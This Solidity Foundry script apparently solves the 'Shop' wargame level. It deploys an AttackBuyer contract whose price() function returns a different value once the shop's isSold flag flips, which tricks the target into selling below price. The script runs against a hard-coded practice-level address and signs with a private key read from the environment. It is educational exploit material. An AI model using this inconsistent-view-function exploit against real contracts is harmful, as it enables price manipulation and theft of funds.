// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBuyer {
    Shop shop;

    constructor(address _address) {
        shop = Shop(_address);
    }

    function attack() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}

contract ShopSolution is Script {
    Shop public shop = Shop(0xe4E56270bAa0162c505a1a45442664dcDc7D8023);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before price : ", shop.price());
        console.log("Before isSold : ", shop.isSold());

        AttackBuyer attackBuyer = new AttackBuyer(address(shop));

        attackBuyer.attack();

        console.log("After price : ", shop.price());
        console.log("After isSold : ", shop.isSold());

        vm.stopBroadcast();
    }
}